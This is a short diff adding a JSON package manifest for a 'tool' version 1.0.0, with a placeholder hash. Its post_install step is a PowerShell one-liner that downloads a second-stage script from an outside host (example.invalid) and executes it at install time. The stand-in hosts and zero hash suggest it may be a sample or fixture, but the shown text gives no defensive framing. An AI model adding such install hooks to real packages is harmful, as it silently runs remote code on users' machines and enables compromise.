@@ -1,0 +1,8 @@
+{
+    "version": "1.0.0",
+    "url": "https://example.com/tool-1.0.0.zip",
+    "hash": "0000000000000000000000000000000000000000000000000000000000000000",
+    "post_install": [
+        "iex ((New-Object System.Net.WebClient).DownloadString('https://example.invalid/stage2.ps1'))"
+    ]
+}
